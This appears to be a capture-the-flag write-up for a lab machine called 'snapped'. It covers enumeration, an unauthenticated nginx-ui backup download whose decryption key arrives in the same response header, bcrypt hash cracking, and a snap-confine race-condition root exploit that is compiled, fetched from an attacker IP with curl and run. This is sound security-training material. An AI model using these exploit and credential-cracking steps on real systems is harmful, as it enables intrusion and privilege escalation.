## Enumeration

Start with classic nmap scan:

```

| ssh-hostkey:

|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports are open: SSH and HTTP. The redirect to `snapped.htb` shows the webserver is doing name-based virtual hosting, so the first step is adding the domain to `/etc/hosts` to browse the site properly.

At that point a subdomain enumeration turns up something worth looking at:

```
admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 37ms]
```

## Exploitation

The panel on `admin.snapped.htb` turns out to be an instance of **nginx-ui**, a tool for managing nginx configurations through a web UI. The version running (2.3.2, as later confirmed by the backup itself) is vulnerable to **CVE-2026-27944**, which allows downloading the system backup through the `/api/backup` endpoint with no authentication at all, and in some cases even gaining access to the dashboard.

For exploitation I used the public PoC: [Skynoxk/CVE-2026-27944](https://github.com/Skynoxk/CVE-2026-27944), run in full mode (`--decrypt`), which besides downloading the backup also tries to create a user to log into the dashboard:

```
python exploit_enhanced.py --target http://admin.snapped.htb --decrypt
```

```
[*] Downloading backup from http://admin.snapped.htb/api/backup
[+] Backup downloaded successfully (18450 bytes)
[+] Saved to: backup.bin

[*] X-Backup-Security header: jiF2JjIwy9bUKlDX8dyfNUPIjqb0SHcGKFZE8xUmGJk=:BoS43uxBy5AXX5Yov7vlCw==
[+] Parsed AES-256 key: jiF2JjIwy9bUKlDX8dyfNUPIjqb0SHcGKFZE8xUmGJk=
[+] Parsed AES IV    : BoS43uxBy5AXX5Yov7vlCw==

[*] Decrypting nginx-ui.zip...
    → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    → Extracted 22 files to backup_extracted/nginx
```

The weakness is right there: the backup is encrypted with AES-256, but **the key and IV are handed back in the `X-Backup-Security` header of the very same HTTP response** that delivers the encrypted file. Encrypting a backup is pointless if whoever downloads it also gets the key to decrypt it in the same request — it's a purely cosmetic security control.

The decrypted archive contains, among other things, the application's SQLite database:

```
├── nginx-ui
│   ├── app.ini
│   └── database.db
```

Opening `database.db` reveals the `users` table with the password hashes:

```
sqlite> select * from users;
1|...|admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh...
2|...|jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
3|...|hacker|$2a$10$PvVZR1kkNN3Cf0TBp/IXKuvuICSN1bEKPrg5M.Oyv263/ueigA7Qy
```

The `hacker` user, created just minutes earlier, is the one automatically added by the exploit script — confirming the endpoint really does allow writing, not just reading the backup. The `jonathan` user is the interesting one, since it's plausibly also a system account, so it's worth trying to crack that bcrypt hash:

```
echo "$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq" > jonathan.hash
john jonathan.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Privilege Escalation

From `jonathan`, some enumeration (kernel version, installed snap packages) points to a second public PoC, for **CVE-2026-3888**: [TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE).

The vulnerability exploits a race condition between `snap-confine` (the SUID binary that prepares the sandbox for snap applications) and `systemd-tmpfiles`, which periodically cleans up temporary directories under `/var/lib/snapd`. In short, the flow is:

1. A `snap-store` session is started, which generates a cached mount namespace in a temporary directory managed by `snap-confine`.
2. The exploit waits for `systemd-tmpfiles` to delete that directory (a periodic event not directly controlled by the attacker — hence the "up to 10 days" wait if not forced).
3. In the window between deletion and recreation, the exploit races in and swaps the directory for one it controls, effectively gaining ownership of `/var/lib/snapd`.
4. At that point a payload is staged (a user `fstab` file and a shared library injected via `ld.so.preload`), which gets executed when `snap-confine`, still SUID root, launches the `su` binary inside the sandbox.

Compiling the two components (the exploit itself and the library that will be injected):

```
gcc -O2 -static -o exploit exploit_caps.c
gcc -shared -fPIC -nostartfiles -o librootshell.so librootshell_caps.c
```

Transferring them to the box and running:

```
jonathan@snapped:~$ curl http://10.10.14.117:8000/exploit -o exploit
jonathan@snapped:~$ curl http://10.10.14.117:8000/librootshell.so -o librootshell.so
jonathan@snapped:~$ chmod +x exploit librootshell.so
jonathan@snapped:~$ ./exploit librootshell.so
```
